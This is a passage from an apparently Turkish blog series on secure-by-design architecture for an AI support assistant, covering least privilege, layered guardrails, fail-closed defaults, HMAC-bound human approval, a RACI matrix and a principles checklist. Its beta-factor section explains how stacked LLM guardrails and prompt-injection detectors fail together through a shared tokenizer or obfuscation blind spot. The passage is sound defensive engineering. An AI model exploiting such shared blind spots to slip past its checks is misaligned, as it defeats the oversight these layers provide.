- *Mimari Test:* Herhangi bir aracı seçin ve şu soruyu sorun: *"Model tamamen saldırganın kontrolüne geçseydi, bu araç elindeki kimlik bilgisiyle en kötü ne yapabilirdi?"* Yanıt "tüm CRM tablosunu okuyabilir" ise en az yetki ilkesi çiğnenmiştir.

### 5.2. Katmanlı savunma (Defense in Depth)
Güvenliği asla tek bir filtreye, tek bir guardrail modeline veya tek bir prompt talimatına emanet etmeyin. Birbirini tamamlayan ve farklı başarısızlık modellerine sahip kontrolleri arka arkaya dizin: giriş doğrulaması, bağlam etiketleme, yürütme kapısı, allowlist ve insan onayı.

- *Mimari Test:* Yüksek etkili her işlem için şu listeyi yapın: Bu işlemin yetkisiz gerçekleşmesi için aynı anda başarısız olması gereken **bağımsız kontrol noktalarını** sayın. Sayı 1 ise sisteminizde katmanlı savunma yoktur; tek bir kör noktada çöker.

### 5.3. Güvenli varsayılanlar ve kapalı kalarak başarısız olma (Fail-Closed Defaults)
Varsayılan yapılandırma daima en kısıtlı durum olmalıdır. Bir güvenlik katmanı çöktüğünde veya zaman aşımına uğradığında sistem riski göze alarak çalışmaya devam etmemeli; güvenli duruma çekilmelidir (*fail-closed*).

- *Uygulama:* Guardrail sınıflandırıcı servisi 500 ms içinde yanıt vermezse, `send_email` gibi dış dünyayı etkileyen işlemler "kullanıcı beklemesin" denilerek onaylanamaz; işlem derhal durdurulur. Buna karşın düşük riskli işlemler (şikâyet metnini özetlemek) kademeli olarak bozulabilir (*graceful degradation* — genel bir hata mesajı dönerek).
- *Mimari Test:* Test ortamında guardrail servisini aniden kapatın. Sistem e-posta göndermeyi durduruyor mu (*fail-closed*), yoksa kontrolleri atlayıp göndermeye devam mı ediyor (*fail-open*)? Gerçek dünya sızıntılarının büyük bölümü sessizce *fail-open* kalan sistemlerden kaynaklanır.

### 5.4. Anlamlı insan denetimi (Meaningful Human-in-the-Loop)
İnsan onayı, ancak onaylayan kişi neyi onayladığını açıkça görebiliyorsa ve inceleyecek bilişsel zamana sahipse geçerli bir kontroldür. İçeriği ve hedefi göstermeden yalnızca "Asistan e-posta göndersin mi? [Evet/Hayır]" diyen bir diyalog kutusu güvenlik kontrolü değil, sorumluluğu çalışana yıkma kurnazlığıdır (OWASP *Human-Agent Trust Exploitation*, ASI09).

- *Uygulama:* Onay ekranı alıcıyı, konu başlığını, e-postanın tam metnini ve hangi müşteri şikâyetine istinaden üretildiğini açıkça listeler. Onay, tam olarak bu parametrelerin kriptografik özetine (`HMAC(id, to, body)`) bağlanır. Model arka planda tek bir harfi değiştirirse bilet geçersiz olur.
- *Mimari Test:* Onay arayüzünde onaylanan eylem ile arka planda API'ye iletilen JSON yükü birebir aynı mıdır? Operatörlerin onaylama oranı %99,9'a ulaşıyorsa orada gerçek bir denetim kalmamış, "onay körlüğü" başlamıştır.

---

## 6. Katmanlı savunmanın matematiği: Beta-faktör modeli ve ortak nedenli çöküş

Katmanlı savunmanın sezgisel temeli James Reason'ın ünlü "İsviçre Peyniri" modelidir. Her peynir diliminde delikler vardır; fakat yeterince dilimi arka arkaya koyarsanız deliklerin tam olarak aynı eksende hizalanması imkânsızlaşır. Ancak bu sezgi, nükleer santral ve havacılık güvenliğinde çok iyi bilinen **Ortak Nedenli Arızalar** (*Common Cause Failures — CCF*) gerçeğiyle yüzleşmediğinde felaketle sonuçlanır.

Bir saldırının $n$ adet ardışık güvenlik katmanından geçmesi gerektiğini düşünelim. $i$. katmanın saldırıyı kaçırma olasılığı bağımsız koşullarda $p_i$ olsun. Eğer katmanlar **kesinlikle bağımsız** ise, saldırının tüm katmanları delip geçme olasılığı basit çarpım kuralıdır:

$$
P_{\text{kaçırma, bağımsız}} = \prod_{i=1}^{n} p_i
$$

Şöyle okuyun: $p_i$, $i$. katmanın kaçırma oranıdır. $\prod$ işareti "tüm katmanların oranlarını birbiriyle çarp" demektir. Çıkan sonuç bağımsız durumdaki birleşik kaçırma olasılığıdır.

Şimdi güvenlik mühendisliğinin acı gerçeğine gelelim: Güvenilirlik mühendisliğinde (IEC 61508 / ISO 26262) kullanılan **Beta-Faktör ($\beta$) Modeli**, sistemik arızaların belirli bir oranının bağımsız değil, *paylaşılan ortak bir nedenden* kaynaklandığını söyler. Yapay zekâ sistemlerinde bu ortak neden; tüm katmanların aynı temel modele dayanması, aynı BPE tokenizer'ı kullanması, aynı dil ailesine karşı eğitilmemiş olması veya aynı gizleme (*obfuscation*) biçimini tanıyamamasıdır.

Sistemik arızaların $\beta$ kadarının ortak bir kör noktaya düştüğünü ve bu kör noktada katmanların ortak kaçırma olasılığının $p_{\text{common}}$ olduğunu kabul edersek, birleşik kaçırma olasılığı şu kesin formülü alır:

$$
P_{\text{kaçırma}} = \beta \cdot p_{\text{common}} + (1 - \beta) \prod_{i=1}^{n} p_i
$$

Şöyle okuyun: $\beta$, saldırıların katmanlar arasındaki ortak sistemik kör noktaya düşme payıdır. $p_{\text{common}}$, bu kör nokta oluştuğunda tüm katmanların birlikte başarısız olma olasılığıdır (sıfır-gün enjeksiyonlarında $p_{\text{common}} = 1$). $1-\beta$ ise saldırının bağımsız çalışan rutin filtreleme mekanizmalarına denk gelme payıdır.

Eğer saldırgan ortak kör noktayı tam hedefleyen bir enjeksiyon örüntüsü kullanıyorsa ($p_{\text{common}} = 1$), formül doğrudan yalın eşiğe indirgenir:

$$
P_{\text{kaçırma}} = \beta + (1 - \beta) \prod_{i=1}^{n} p_i
$$

### Adım Adım Küçük Sayısal Yürüyüş

Destek asistanımızın `send_email` aracı önünde üç katmanlı bir savunma hattı kurduğumuzu varsayalım:
1. Katman 1 ($p_1 = 0,10$): Girdi prompt injection dedektörü (saldırıların %10'unu kaçırıyor).
2. Katman 2 ($p_2 = 0,20$): LLM hakemli çıktı politika denetleyicisi (saldırıların %20'sini kaçırıyor).
3. Katman 3 ($p_3 = 0,05$): Deterministik alıcı allowlist ve şema denetleyicisi (kural dışı adreslerin %5'ini yapılandırma hatasıyla kaçırıyor).

Katmanlar arasında $\beta = 0,04$ (%4) oranında ortak bir tokenizer manipülasyonu kör noktası olduğunu ve bu kör noktada ortak kaçırmanın $p_{\text{common}} = 1,0$ olduğunu varsayalım:

```text
Katman parametreleri:
  p1 = 0,10   (Girdi injection dedektörü)
  p2 = 0,20   (Çıktı güvenlik hakemi)
  p3 = 0,05   (Şema ve kural denetleyicisi)
  β  = 0,04   (Ortak mimari kör nokta payı)
  p_common = 1,0 (Kör noktada tam sızma)

1. Adım: Bağımsız olasılık hesabı
  P_indep = p1 × p2 × p3
          = 0,10 × 0,20 × 0,05
          = 0,02 × 0,05
          = 0,0010              → Kâğıt üstünde 1.000 saldırıda yalnızca 1 kaçırma (%0,10)

2. Adım: Ortak nedenli arıza (Beta-faktör) hesabı
  P_ortak   = β × p_common
            = 0,04 × 1,0 = 0,0400
  P_rutin   = (1 - β) × P_indep
            = (1 - 0,04) × 0,0010
            = 0,96 × 0,0010 = 0,00096
  P_toplam  = P_ortak + P_rutin
            = 0,0400 + 0,00096
            = 0,04096           → Gerçekte 1.000 saldırıda ~41 kaçırma (%4,10)

3. Adım: Yanılsama katsayısı
  Oran = 0,04096 / 0,0010 ≈ 41 kat daha zayıf sistem!
```

Bu hesaplama bir güvenlik mimarı için hayati bir ders sunar: **Katmanların altına konulan $\beta$ tabanı, eklediğiniz yapay zekâ filtrelerinin sayısından bağımsızdır.** Dördüncü ve beşinci LLM tabanlı guardrail'i ekleseniz dahi sistemin sızma olasılığı asla %4'ün altına inemez. Çünkü saldırgan bu ortak kör noktayı keşfettiğinde tüm LLM filtreleri aynı anda devreden çıkar.

Bu tabanı kırmanın tek yolu **mimari çeşitliliktir** (*Architectural Diversity*): Savunmaya model tabanlı olmayan, tamamen deterministik bir kural katmanı eklemektir. Alıcı allowlist'i ve HMAC parametre doğrulaması tam olarak bu işi görür: "Bu metin bir saldırı mı?" diye analiz etmez; "Bu alıcı kayıtlı müşteri mi?" diye sorar.

Aşağıdaki Python betiği bu matematiksel yürüyüşü ve 1.000.000 döngülük Monte Carlo simülasyonunu doğrulamaktadır:

```python
import random

p = [0.10, 0.20, 0.05]   # Katman kaçırma oranları
beta = 0.04              # Ortak nedenli kör nokta payı
p_common = 1.0           # Kör noktadaki sızma oranı

# 1. Teorik analitik hesaplama
independent = 1.0
for x in p:
    independent *= x
correlated = beta * p_common + (1.0 - beta) * independent

print(f"Teorik Bağımsız Kaçırma : {independent:.6f} (%{independent*100:.3f})")
print(f"Teorik Beta-Faktör Kaçırma: {correlated:.6f} (%{correlated*100:.3f})")
print(f"Hata Katlanma Çarpanı   : {correlated / independent:.1f}x")

# 2. Monte Carlo ampirik doğrulaması (1.000.000 deneme)
random.seed(42)
N, missed = 1_000_000, 0

for _ in range(N):
    if random.random() < beta:
        # Ortak kör noktaya düştü: p_common olasılığıyla sızar
        if random.random() < p_common:
            missed += 1
    else:
        # Bağımsız katmanlardan geçmeye çalışır
        if all(random.random() < x for x in p):
            missed += 1

simulated_rate = missed / N
print(f"Monte Carlo Simülasyonu : {simulated_rate:.6f} (%{simulated_rate*100:.3f})")
```

Konsol çıktısı:

```text
Teorik Bağımsız Kaçırma : 0.001000 (%0.100)
Teorik Beta-Faktör Kaçırma: 0.040960 (%4.096)
Hata Katlanma Çarpanı   : 41.0x
Monte Carlo Simülasyonu : 0.040845 (%4.085)
```

---

## 7. Mühendisliğin iki gözü: Kurulum zamanı ve çalışma zamanı

Yapay zekâ altyapısındaki eğitim ve çıkarım ayrımı gibi, yapay zekâ güvenlik mimarisinin de iki farklı çalışma rejimi vardır:

**Kurulum zamanı** (*Build Time*), ilk kullanıcı isteği gelmeden önceki evredir: eğitim ve ince ayar verisi toplamak, açık kaynaklı ağırlık indirmek, sistem prompt'u ve araç şemalarını yazmak, guardrail modellerini eğitmek ve kırmızı takım testlerinden geçirmek. Buradaki saldırılar **yavaş, gizli ve kalıcıdır**. Zehirlenmiş bir adaptör veya arka kapılı (*backdoored*) bir model dosyası sonraki tüm kullanıcı oturumlarını etkiler; saldırganın tek bir defa başarılı olması yeterlidir. Buradaki kontroller **köken takibi, kriptografik imza (Sigstore/Cosign), SBOM ve değişiklik yönetimidir**.

**Çalışma zamanı** (*Run Time*), her bir kullanıcı isteğinin milisaniyeler süren ömrüdür: kimlik doğrulama, prompt montajı, RAG erişimi, LLM çıkarımı, PEP politika kontrolü, araç çalıştırma ve loglama. Buradaki saldırılar **hızlı, dinamik ve tekrarlıdır**. Bir saldırgan dakikada yüzlerce prompt varyasyonu deneyebilir. Buradaki kontroller **güven sınırları, parametre doğrulaması, en az yetki ve bütçe tavanlarıdır**.

ETSI EN 304 223 (Ocak 2026'da yürürlüğe giren Avrupa Yapay Zekâ Siber Güvenlik Standardı), bu süreci beş yaşam döngüsü evresine ayırır: Tasarım, Geliştirme, Dağıtım, Bakım ve Kullanımdan Kaldırma (*Decommissioning*). Son evre olan kullanımdan kaldırma sıklıkla unutulur: Bir asistan emekliye ayrıldığında geride bırakılan vektör indeksleri, fine-tuning ağırlıkları ve log arşivleri temizlenmezse kalıcı bir veri sızıntısı kaynağına dönüşür.

<!-- fig:p1_lifecycle -->
<svg viewBox="0 0 720 346" role="img" aria-label="Yapay zekâ yaşam döngüsü soldan sağa beş evrede: tasarım, geliştirme, dağıtım, bakım ve kullanımdan kaldırma. Tasarım ve geliştirme kurulum zamanıdır; saldırılar yavaş ve kalıcıdır, kontroller köken ve değişiklik yönetimidir. Dağıtım ve bakım çalışma zamanıdır; saldırılar hızlı ve tekrarlanabilirdir, kontroller sınırlar ve bütçelerdir. Kullanımdan kaldırma dizinleri, logları ve adaptörleri siler, anahtarları iptal eder." style="max-width:100%;height:auto;display:block;margin:var(--sp-5) auto;font-family:var(--font-sans)">
<defs>
<marker id="p1l-arr" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" style="fill:var(--c-text-mute)"/></marker>
<marker id="p1l-g" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" style="fill:var(--c-accent-2)"/></marker>
</defs>
<text x="16" y="24" text-anchor="start" style="fill:var(--c-accent);font-size:14px;font-weight:700;letter-spacing:.02em">Tek Yaşam Döngüsü, Beş Güvenlik Evresi (ETSI EN 304 223)</text>
<rect x="16" y="92" width="120" height="96" rx="8" style="fill:var(--c-surface);stroke:var(--c-accent);stroke-width:1.2"/>
<text x="76" y="114" text-anchor="middle" style="fill:var(--c-text);font-size:13px;font-weight:600">Tasarım</text>
<text x="26" y="138" text-anchor="start" style="fill:var(--c-text-mute);font-size:11px">varlıklar, sahipler</text>
<text x="26" y="153" text-anchor="start" style="fill:var(--c-text-mute);font-size:11px">tehdit modeli</text>
<text x="26" y="168" text-anchor="start" style="fill:var(--c-text-mute);font-size:11px">güven sınırları Z0-Z5</text>
<line x1="136" y1="140" x2="156" y2="140" marker-end="url(#p1l-arr)" style="stroke:var(--c-text-mute);stroke-width:1.5"/>
<rect x="158" y="92" width="120" height="96" rx="8" style="fill:var(--c-surface);stroke:var(--c-accent);stroke-width:1.2"/>
<text x="218" y="114" text-anchor="middle" style="fill:var(--c-text);font-size:13px;font-weight:600">Geliştirme</text>
<text x="168" y="138" text-anchor="start" style="fill:var(--c-text-mute);font-size:11px">veri, köken zinciri</text>
<text x="168" y="153" text-anchor="start" style="fill:var(--c-text-mute);font-size:11px">model, adaptörler</text>
<text x="168" y="168" text-anchor="start" style="fill:var(--c-text-mute);font-size:11px">güvenlik şemaları</text>
<line x1="278" y1="140" x2="298" y2="140" marker-end="url(#p1l-arr)" style="stroke:var(--c-text-mute);stroke-width:1.5"/>
<rect x="300" y="92" width="120" height="96" rx="8" style="fill:var(--c-surface);stroke:var(--c-warn);stroke-width:1.2"/>
<text x="360" y="114" text-anchor="middle" style="fill:var(--c-text);font-size:13px;font-weight:600">Dağıtım</text>
<text x="310" y="138" text-anchor="start" style="fill:var(--c-text-mute);font-size:11px">PEP/PDP kapısı</text>
<text x="310" y="153" text-anchor="start" style="fill:var(--c-text-mute);font-size:11px">araç sandboxing</text>
<text x="310" y="168" text-anchor="start" style="fill:var(--c-text-mute);font-size:11px">HMAC onay mekanizması</text>
<line x1="420" y1="140" x2="440" y2="140" marker-end="url(#p1l-arr)" style="stroke:var(--c-text-mute);stroke-width:1.5"/>
<rect x="442" y="92" width="120" height="96" rx="8" style="fill:var(--c-surface);stroke:var(--c-warn);stroke-width:1.2"/>
<text x="502" y="114" text-anchor="middle" style="fill:var(--c-text);font-size:13px;font-weight:600">Bakım</text>
<text x="452" y="138" text-anchor="start" style="fill:var(--c-text-mute);font-size:11px">kırmızı takım (ART)</text>
<text x="452" y="153" text-anchor="start" style="fill:var(--c-text-mute);font-size:11px">OTel izleme</text>
<text x="452" y="168" text-anchor="start" style="fill:var(--c-text-mute);font-size:11px">olay müdahalesi</text>
<line x1="562" y1="140" x2="582" y2="140" marker-end="url(#p1l-arr)" style="stroke:var(--c-text-mute);stroke-width:1.5"/>
<rect x="584" y="92" width="120" height="96" rx="8" style="fill:var(--c-surface);stroke:var(--c-danger);stroke-width:1.2"/>
<text x="644" y="114" text-anchor="middle" style="fill:var(--c-text);font-size:13px;font-weight:600">Kaldırma</text>
<text x="594" y="138" text-anchor="start" style="fill:var(--c-text-mute);font-size:11px">vektör dizini silme</text>
<text x="594" y="153" text-anchor="start" style="fill:var(--c-text-mute);font-size:11px">ağırlıkları kripto-sil</text>
<text x="594" y="168" text-anchor="start" style="fill:var(--c-text-mute);font-size:11px">anahtarları iptal et</text>
<rect x="16" y="46" width="262" height="32" rx="6" style="fill:var(--c-accent);fill-opacity:.10;stroke:var(--c-accent);stroke-width:1.3"/>
<text x="147" y="66" text-anchor="middle" style="fill:var(--c-text);font-size:12px">kurulum zamanı: köken, imza, denetim</text>
<rect x="300" y="46" width="262" height="32" rx="6" style="fill:var(--c-warn);fill-opacity:.10;stroke:var(--c-warn);stroke-width:1.3"/>
<text x="431" y="66" text-anchor="middle" style="fill:var(--c-text);font-size:12px">çalışma zamanı: sınırlar, PEP, bütçeler</text>
<rect x="584" y="46" width="120" height="32" rx="6" style="fill:var(--c-danger);fill-opacity:.10;stroke:var(--c-danger);stroke-width:1.3"/>
<text x="644" y="66" text-anchor="middle" style="fill:var(--c-text);font-size:12px">kriptografik silme</text>
<path d="M502 188 V218 H218 V190" marker-end="url(#p1l-g)" style="fill:none;stroke:var(--c-accent-2);stroke-width:1.5"/>
<text x="360" y="236" text-anchor="middle" style="fill:var(--c-text-mute);font-size:11.5px">her prompt, model veya araç kuralı değişikliği gerileme testine döner</text>
<!-- Bottom Educational Banner -->
<rect x="16" y="274" width="688" height="62" rx="6" style="fill:var(--c-accent);fill-opacity:.07;stroke:var(--c-accent);stroke-width:1.2"/>
<text x="28" y="293" text-anchor="start" style="fill:var(--c-accent);font-size:11px;font-weight:700;letter-spacing:.02em">💡 YAŞAM DÖNGÜSÜ YÖNETİŞİMİ: YAPAY ZEKA GÜVENLİĞİ TEK SEFERLİK BİR ADIM DEĞİLDİR</text>
<text x="28" y="311" text-anchor="start" style="fill:var(--c-text);font-size:10.5px">Tasarım aşamasından imhaya kadar her değişiklik otomatik gerileme testlerine ve köken doğrulamasına tabidir.</text>
<text x="28" y="327" text-anchor="start" style="fill:var(--c-text-mute);font-size:10px">Sistemden kaldırılan her model ve veri; kriptografik anahtar iptali ve dizin temizliği ile kalıcı olarak imha edilir.</text>
</svg>

---

## 8. Neyin sahibi kim? Sorumluluk matrisi

Giriş sahnesindeki sessiz toplantı odasına dönelim. Karışıklığı çözen şey yeni bir filtre değil; net bir kurumsal sorumluluk haritasıdır. **RACI** matrisi bu amaçla kullanılır: Her faaliyet için kimin **R**esponsible (işi yapan), kimin **A**ccountable (nihai sonucu üstlenen; her satırda tam bir kişi/birim), kimin **C**onsulted (danışılan uzman) ve kimin **I**nformed (bilgilendirilen) olduğunu tanımlar.

| Faaliyet | İş Birimi Sahibi | AI / ML Ekibi | Yazılım Ekibi | Platform / SRE | Güvenlik Mimarı | DPO / Hukuk |
| --- | --- | --- | --- | --- | --- | --- |
| Kullanım senaryosu ve kabul edilebilir risk eşiği | **A** | C | C | I | C | C |
| Varlık envanteri ve güven sınırları (Z0–Z5) | C | R | R | R | **A** | C |
| Veri kökeni, PII ayrıştırma ve saklama politikası | C | R | R | I | C | **A** |
| Model, adaptör ve tedarik zinciri kabulü | I | R | C | R | **A** | I |
| PEP/PDP kapısı, araç yetkileri ve HITL akışı | C | C | R | C | **A** | I |
| Gateway, mTLS ve ağ izolasyon altyapısı | I | I | C | R | **A** | I |
| Kırmızı takım (Red Teaming) ve değerlendirme | I | R | C | I | **A** | C |
| OTel denetim loglaması ve olay müdahale planı | I | C | R | R | **A** | C |
| Canlıya geçiş ve kalan riskin resmi kabulü | **A** | C | C | C | R | C |

Bu matristeki iki kural pazarlıksızdır:
1. **Kalan riski güvenlik ekibi değil, iş birimi sahibi kabul eder.** Güvenlik ekibi riski ölçer, modeller ve önlemleri tasarlar. Fakat riski üstlenip canlıya çıkma kararı, ticari getirinin sahibi olan iş birimine aittir.
2. **Her satırda yalnızca bir adet "A" bulunur.** Birden fazla ekibin hesap verdiği bir sistemde gerçekte hiç kimse hesap vermez. ISO/IEC 42001 (Yapay Zekâ Yönetim Sistemi) denetimlerinde incelenen ilk belge bu tablodur.

---

## 9. Pratik çıktı: Tek sayfalık ilke listesi

Kendi projenizin mimari tasarım belgesine (RFC / ADR) doğrudan ekleyebileceğiniz denetlenebilir ilke listesi:

1. **Altı güven bölgesi (Z0–Z5) haritalanmıştır.** Dış girdi, giriş sınırı, çıkarım motoru, PEP kapısı, araçlar ve loglama düzlemleri mimaride ayrılmıştır.
2. **Propose vs. Commit ilkesi kesindir.** Model çıktıları asla doğrudan yürütülmez; bir eylem oluşturmadan önce deterministik PEP kapısından geçmek zorundadır.
3. **Model çıktısı güvenilmeyen girdidir.** Hiçbir model üretimi doğrulanmadan veritabanına, kabuk komutuna veya e-posta sunucusuna iletilmez.
4. **Araçlar kullanıcının kimlik kapsamıyla sınırlandırılmıştır.** Araçlar genel yönetici hesaplarıyla değil; oturum açmış kullanıcının izinleriyle çalışır.
5. **Yüksek etkili işlemler çalıştırma noktasında deterministik allowlist ile korunur.** Bu kontroller modelin metin analizine dayanmaz.
6. **İnsan onayları tam parametre özetine (HMAC) bağlanır.** Onaylanan metin ile gönderilen metin arasında tek bir karakter dahi değişirse eylem reddedilir.
7. **Yüksek riskli kontroller kapalı kalarak başarısız olur (fail-closed).** Guardrail servisi çöktüğünde işlem durdurulur.
8. **Her isteğin token, adım sayısı, gecikme ve maliyet tavanı tanımlıdır.**
9. **Kurulum zamanı artefaktlarının kökeni kriptografik olarak imzalanmıştır.** Model ağırlıkları, adaptörler ve veri setleri SBOM ile taranır.
10. **Denetim logları OpenTelemetry standartlarına uyar ve tuzlu token hash'leri ile saklanır.** Hassas kullanıcı verisi loglara sızdırılmaz.
11. **Güvenlik iddiaları kesin test verileri ve güven aralıklarıyla sunulur.** "Tam korumalı" gibi afaki iddialar yasaktır.
12. **Kullanımdan kaldırma (decommissioning) planı hazırdır.** Sistem kapatıldığında vektör indeksleri, loglar ve API anahtarları kriptografik olarak silinir.

---

## 10. Seri buradan nereye gidiyor?

Destek asistanımızı adım adım kurumsal bir kaleye dönüştüreceğimiz yol haritası:

| Aşama | Bölümler | Çözülen Temel Mühendislik Problemi |
| --- | --- | --- |
| **Temeli kur** | 1–2 | Varlıklar, altı güven bölgesi, veri akışı ve STRIDE/ATLAS tehdit modeli |
| **Veriyi ve modeli koru** | 3–4 | Diferansiyel mahremiyet, veri zehirleme, safetensors, SBOM ve MCP tedarik zinciri |
| **Çalışma zamanı kontrolleri** | 5–9 | GCG jailbreak'leri, katmanlı guardrails, RAG yetki izolasyonu, ajan sandbox'ları ve gizli çıkarım |
| **Ölç ve işlet** | 10–11 | Kırmızı takım testleri, Clopper-Pearson güven aralıkları, OTel logları ve olay runbook'u |
| **Kanıtla ve yayınla** | 12 | ISO 42001, NIST AI 600-1 çapraz tablosu, imzalı yayın manifestosu ve canlıya geçiş kapısı |

### Okuyucu artık hangi sorulara kendi başına yanıt verebilir?

- Destek asistanının mimari diyagramında güvenilmeyen metin ile işlem yetkisi tam olarak hangi güven bölgesinde buluşur?
- "Propose vs. Commit" ayrımı neden bir dil modelinin güvenliğini prompt seviyesinden mimari seviyeye taşır?
- Katmanlı savunmada paylaşılan ortak bir kör nokta ($\beta = 0,04$), nominal olarak binde bir olan kaçırma olasılığını neden 41 kat artırır?
- Emniyet (*safety*) ile güvenlik (*security*) arasındaki fark nedir ve neden biri olmadan diğeri sistemi koruyamaz?
- Bir yapay zekâ bileşeni çöktüğünde *fail-closed* ile *fail-open* davranışı arasındaki mimari ödünleşim nasıl yönetilmelidir?

---

## Bütün hikâye altı satırda

- Bir AI sistemi dört varlık sınıfını korur: veri, model, işlem yetkisi ve (maliyet dahil) hizmet sürekliliği.
- Model çıktıları yalnızca birer öneridir (*proposal*); hiçbir eylem deterministik PEP kapısından geçmeden yürütülemez (*commit*).
- Güvenlik, emniyet, mahremiyet ve güvenilirlik dört farklı soruya yanıt verir; tek bir filtre hepsini karşılayamaz.
- Katmanlar ancak bağımsız olduklarında riski çarpar; %4'lük ortak bir sistemik kör nokta kaçırma oranını 41 kat kötüleştirdi.
- Kurulum zamanı saldırıları yavaş ve kalıcıdır; çalışma zamanı saldırıları hızlı ve tekrarlıdır.
- Her güvenlik faaliyetinin tek bir hesap veren sahibi olmalıdır; kalan riski güvenlik ekibi değil, iş birimi sahibi kabul eder.

---

## Terimler sözlüğü

- **Güven Bölgesi (Trust Zone):** Benzer güvenlik gereksinimlerine ve güven düzeyine sahip sistem bileşenlerini ayıran sınır; asistanımızda Z0'dan Z5'e altı bölge mevcuttur.
- **Propose vs. Commit:** Modelin yalnızca işlem önerisi üretebildiği, gerçek yürütmenin ise deterministik bir politika kontrolünden sonra gerçekleştiği temel mimari kural.
- **Politika Zorlama Noktası (PEP — Policy Enforcement Point):** Modelin önerdiği araç çağrısını yakalayıp yetki ve kısıtları denetleyen kapı.
- **Etki Alanı (Blast Radius):** Tek bir bileşenin ele geçirilmesiyle oluşabilecek en kötü senaryodaki gerçek dünya sonuçlarının büyüklüğü.
- **İşlem Yetkisi:** Modelin dış dünyayı değiştirme hakkı (e-posta gönderme, veritabanına yazma, para transferi yapma).
- **Davranışsal Bütünlük:** Modelin ağırlıkları değişmese dahi, işlemlerinin yetkili kullanıcının niyetini yansıtma derecesi.
- **Ortak Nedenli Arıza (CCF — Common Cause Failure):** Birden fazla koruma katmanının aynı temel zaaf veya kör nokta nedeniyle eşzamanlı çökmesi.
- **Beta-Faktör ($\beta$):** Güvenilirlik mühendisliğinde toplam arıza payı içinde ortak nedenli arızaların oranını gösteren katsayı.
- **Fail-Closed / Fail-Open:** Bir güvenlik kontrolü arızalandığında işlemin durdurulması (kapalı) veya sessizce geçirilmesi (açık).
- **Kalan Risk (Residual Risk):** Bütün güvenlik katmanları uygulandıktan sonra sistemde kalan ve hesap veren yönetici tarafından kabul edilen artık risk.

---

## Daha derine inmek için

- [K1] NIST, [*AI 600-1: Generative AI Profile to the AI Risk Management Framework*](https://doi.org/10.6028/NIST.AI.600-1) (Temmuz 2024): Üretken yapay zekâya özgü 12 risk profili ve mimari güven sınırları.
- [K2] NIST, [*SP 800-218A: Secure Software Development Practices for Generative AI*](https://csrc.nist.gov/pubs/sp/800/218/a/ipd) (2024): Kurulum ve çalışma zamanı güvenlik kontrolleri.
- [K3] ISO/IEC, [*42001:2023 Artificial Intelligence Management System*](https://www.iso.org/standard/42001): Kurumsal roller, sorumluluklar ve hesap verebilirlik standardı.
- [K4] ETSI, [*EN 304 223: Securing Artificial Intelligence, Cyber Security Requirements*](https://www.etsi.org/newsroom/press-releases/2627-etsi-releases-world-leading-standard-for-securing-ai) (Ocak 2026): Beş yaşam döngüsü evresi boyunca 13 temel siber güvenlik gereksinimi.
- [K5] IEC, [*61508: Functional Safety of Electrical/Electronic/Programmable Electronic Safety-related Systems*](https://www.iec.ch/functional-safety): Ortak Nedenli Arızalar (CCF) ve Beta-Faktör güvenilirlik modellemesi.
- [K6] OWASP GenAI Security Project, [*Top 10 for LLM Applications 2025/2026*](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10) ve [*Top 10 for Agentic Applications*](https://genai.owasp.org/): Excessive Agency ve Goal Hijacking kılavuzları.
- [K7] Google, [*Secure AI Framework (SAIF)*](https://safety.google/cybersecurity-advancements/saif/): Kurumsal yapay zekâ sistemleri için 6 temel güvenlik prensibi.
- [K8] Bu seriden: [Secure AI by Design (2): AI Sistemlerinde Tehdit Modelleme ve Güven Sınırları](post.html?slug=ai-tehdit-modelleme-ve-guven-sinirlari).
